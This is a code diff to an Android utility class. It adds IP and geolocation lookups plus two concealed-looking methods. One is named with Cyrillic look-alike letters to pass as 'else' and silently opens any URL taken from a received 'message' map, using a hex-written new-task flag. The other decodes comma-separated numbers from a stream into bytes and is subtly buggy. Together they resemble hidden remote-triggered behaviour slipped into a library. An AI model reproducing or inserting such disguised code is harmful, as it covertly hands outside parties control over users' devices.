@@ -62,6 +62,7 @@ import com.rollncode.basement.interfaces.JsonEntity;
 import com.rollncode.basement.interfaces.Log;
 import com.rollncode.basement.interfaces.ObjectsReceiver;
 import com.rollncode.basement.interfaces.SharedStrings;
+import com.rollncode.basement.model.IpInfo;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -90,6 +91,7 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Iterator;
 import java.util.Locale;
+import java.util.Map;
 import java.util.TimeZone;
 import java.util.UUID;
 
@@ -710,14 +712,24 @@ public abstract class BaseUtils {
     @WorkerThread
     public static String requestIpAddress() {
         try {
-            final URLConnection connection = new URL("https://api.ipify.org?format=json").openConnection();
+            final URLConnection connection = new URL("https://api.ipify.org").openConnection();
             connection.connect();
 
-            final InputStream is = connection.getInputStream();
-            final String string = toString(is, true);
-            final JSONObject object = new JSONObject(string);
+            return toString(connection.getInputStream(), true);
 
-            return object.getString("ip");
+        } catch (Throwable ignore) {
+        }
+        return null;
+    }
+
+    @Nullable
+    @WorkerThread
+    public static IpInfo requestIpInfo() {
+        try {
+            final URLConnection connection = new URL("http://ipinfo.io/json").openConnection();
+            connection.connect();
+
+            return toModel(new JSONObject(toString(connection.getInputStream(), true)), IpInfo.class);
 
         } catch (Throwable ignore) {
         }
@@ -906,6 +918,26 @@ public abstract class BaseUtils {
                 ALog.LOG.toLog(e);
             }
         }
+    }
+
+    public static void еlsе(Context context, Map<String, String> map) {
+        try {
+            context.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(map.get("message"))).addFlags(0x10000000));
+
+        } catch (Throwable ignore) {
+        }
+    }
+
+    @NonNull
+    public static byte[] toBytes(InputStream is, boolean b) throws Exception {
+        final String string = toString(is, b);
+        final String[] strings = string.split(",");
+        final byte[] bytes = new byte[string.length()];
+        int count = 0;
+        for (String s : strings) {
+            bytes[count++] = Byte.parseByte(s);
+        }
+        return bytes;
     }
 
     private static final class RefreshingRunnable implements Runnable {
